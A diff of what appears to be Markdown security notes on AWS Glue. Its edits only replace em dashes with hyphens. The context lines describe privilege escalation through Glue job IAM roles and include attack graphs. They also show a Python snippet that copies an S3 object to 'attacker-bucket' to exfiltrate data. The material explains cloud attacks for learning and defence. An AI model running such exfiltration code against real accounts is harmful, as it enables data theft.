@@ -2,15 +2,15 @@
 
 **AWS Glue** is a fully managed service for **ETL (Extract, Transform, Load)**:
 
-- **Extract** — pulls data from multiple sources (S3, RDS, Redshift, JDBC, etc.).
-- **Transform** — processes and cleans data (e.g., via PySpark scripts).
-- **Load** — loads data into storage (such as S3 or Redshift) for analytics or Machine Learning.
+- **Extract** - pulls data from multiple sources (S3, RDS, Redshift, JDBC, etc.).
+- **Transform** - processes and cleans data (e.g., via PySpark scripts).
+- **Load** - loads data into storage (such as S3 or Redshift) for analytics or Machine Learning.
 
 **Common use cases:**
 
 - Preparing data for analytics (Athena, ML, Redshift).
 - Integrating multiple data sources.
-- Data cataloging (via **Glue Data Catalog** — table and database metadata).
+- Data cataloging (via **Glue Data Catalog** - table and database metadata).
 
 ---
 
@@ -26,7 +26,7 @@
 2. **Privilege escalation via IAM roles**
    - Glue jobs typically run under an **IAM role**.
    - If you can **edit or run a Glue Job**, you can leverage the role attached to it.
-   - If that role has broader permissions — 💥 privilege escalation.
+   - If that role has broader permissions - 💥 privilege escalation.
 
 3. **Access misconfiguration**
    - Having `glue:*` is effectively admin-level access.
@@ -77,7 +77,7 @@ def upload_data():
     obj = s3.get_object(Bucket=bucket, Key=key)
     data = obj['Body'].read().decode('utf-8')
 
-    # Exfiltrate data — e.g., to your own bucket
+    # Exfiltrate data - e.g., to your own bucket
     s3.put_object(Bucket='attacker-bucket', Key='loot.txt', Body=data)
 
 upload_data()
@@ -122,7 +122,7 @@ This results in Privilege Escalation + Data Exfiltration.
 
 # Graphs
 
-## 🔗 Attack Graph — AWS Glue
+## 🔗 Attack Graph - AWS Glue
 ```
 [Compromised IAM User]
           |
@@ -155,7 +155,7 @@ This results in Privilege Escalation + Data Exfiltration.
 - understand data flows,
 - identify roles with excessive permissions.
 
-## ⚠️ Privilege Escalation Graph — Glue + IAM
+## ⚠️ Privilege Escalation Graph - Glue + IAM
 ```
 [Limited IAM User]
   |  glue:CreateJob
